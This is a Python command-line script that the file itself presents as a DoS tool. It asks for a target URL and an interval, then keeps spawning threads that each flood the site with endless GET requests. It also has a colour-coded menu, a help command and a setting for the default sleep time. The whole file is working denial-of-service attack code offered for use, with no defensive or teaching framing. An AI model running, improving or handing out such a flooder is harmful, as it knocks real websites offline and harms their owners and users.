import threading
import requests
import time
from datetime import date , datetime
import os.path
from os import system

os.system("") #init color

current_date=datetime.now().date()
current_datetime=datetime.now()

try:
    from components.logo import logo
    from components.components import commands , settings , col
    print(col.PURPLE+logo)
except ImportError as err:
    print(col.RED+'[!]',col.YELLOW+"Failed import modules: >>>", err)

print(commands)

while True:
    setup=input(col.PURPLE+'Enter command:>>>')
    
    if setup=='--DoS' or setup.startswith('http'):
        check_file=os.path.exists("components/settings/deftime.txt")
        try:
            r = requests.get("https://www.google.com/")
            print(col.GREEN+'Internet Connection OK!')
        except:
            print(col.WARN+'[!]',col.WARN+"Connection Error!")
            continue
        
        if setup.startswith('http'):
            site=setup
            while True:
                try:
                    r = requests.get(site)
                    print(col.GREEN+'Connection to:',site,',OK!')
                    break
                except:
                    print(col.RED+'[!]',col.YELLOW+"Invalid URL!")
                    site = input(col.PURPLE+'Enter object URL: >>>')
        
        else:
            while True:
                site = input(col.PURPLE+'Enter object URL: >>>')
                try:
                    r = requests.get(site)
                    print(col.GREEN+'Connection to:',site,',OK!')
                    break
                except:
                    print(col.RED+'[!]',col.YELLOW+"Invalid URL!")
                    continue
              
        print(col.PURPLE)
        while True:
            if check_file:
                deffile=open("components/settings/deftime.txt")
                deftime=deffile.read()
                fg=input(col.PURPLE+"Do you want to use setted time sleep? (n/y):>>>")
                if fg=="y":
                    sleep=float(deftime)
                    print(col.PURPLE+f"Setted time: {sleep}")
                    deffile.close()
                    break
                else:
                    pass
            try:
                sleep = float(input(col.PURPLE+'Enter time sleep: >>>'))
                break
            except:
                print(col.RED+'[!]',col.YELLOW+'Please ,Enter floatable number !')
                
        print(col.STOP)
        def dos():
            while True:
                try:
                    requests.get(site)
                except Exception as e:
                        print(col.RED+'PRESS Ctrl+V to out Request Error , object cloused or your IP blocked, trying to connect...')
                        print(col.STOP)

        print(col.GREEN +'DoS successfully started to:', site)
        print(col.STOP)
        while True:
            time.sleep(sleep)
            threading.Thread(target=dos).start()
            
    if setup=='--help':
        try:
            print(commands)
        except:
            print(col.RED+'[!]',col.YELLOW+"Error , module 'commands' is a unavaible")
        continue #Они нужны

    if setup=='--settings':
        print("This is a settings")
        try:
            print(settings)
        except:
            print(col.RED+'[!]',col.YELLOW+"Critical Error , module 'settings' is a unavaible , can't print settings help")
        while True:
            setting1=input(col.PURPLE+'Enter settings:>>>')
            if setting1.startswith("def"):
                while True:
                    try:
                        sleep1 = input(col.PURPLE+'(to out type exit)Enter default time sleep: >>>')
                        if sleep1.startswith("ex"):
                            break
                        else:
                            file=open("components/settings/deftime.txt","w")
                            file.write(sleep1)
                            print(col.GREEN+'[!]',f"Succesufully writed default time sleep, time:{sleep1}")
                            file.close()
                            break
                    except Exception as e:
                        print(col.RED+'[!]',col.YELLOW+f'Error:{e}')
                        break
                    
            if setting1.startswith("ex"):
                print("Exiting from settings!")
                break
            
        continue

    else:
        print(col.RED+'[!]',col.YELLOW+'Error , undefined command')
